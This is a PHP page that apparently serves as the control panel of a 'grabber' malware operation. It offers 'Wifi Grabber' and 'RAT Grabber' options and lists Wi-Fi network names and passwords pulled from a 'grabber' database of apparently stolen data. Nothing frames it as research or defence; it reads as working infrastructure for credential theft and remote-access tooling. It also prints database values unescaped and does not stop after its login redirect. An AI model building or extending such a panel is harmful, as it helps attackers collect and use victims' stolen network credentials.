<?php
include "connect.php";

if(!isset($_SESSION))
{
    session_start();
}

if (isset($_SESSION['idusuario']) == false) {
  header("Location: index.php");
}
 ?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Main page</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="grabber.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  </head>
  <body>
    <div id="option">
      <select name="opt" id="opt" form="opform">
        <option value="wifi">Wifi Grabber</option>
        <option value="rat">RAT Grabber</option>
      </select>

      <form id="opform" method="GET" >
        <button>Select</button>
      </form>

    </div>
  </body>
</html>
<?php
if(isset($_GET["opt"])){
  $option = $_GET["opt"];
  if($option == "wifi"){

    $c = new Connect();
    $conection = $c->returnConn("grabber");
    if($conection){
      $query = "select * from wifi_grabber";
      $data = $c->returnQuery($conection, $query);
      echo "<div id='data_table'>";
      echo "<table border='0'><tr id='title'><td>IDENTIFIER</td><td>WIFI NAME</td><td>WIFI PASSWORD</td></tr>";
      while ($row = mysqli_fetch_array( $data )){
        echo "<tr><td> " . $row["identifier"] . "</td>";
        echo "<td> ". $row["wifi_name"] ."</td>";
        echo "<td> ". $row["wifiPass"] ."</td>";
        echo "<tr>";
      }
      echo "</table>";
      echo "</div>";
    }
  }
}
?>
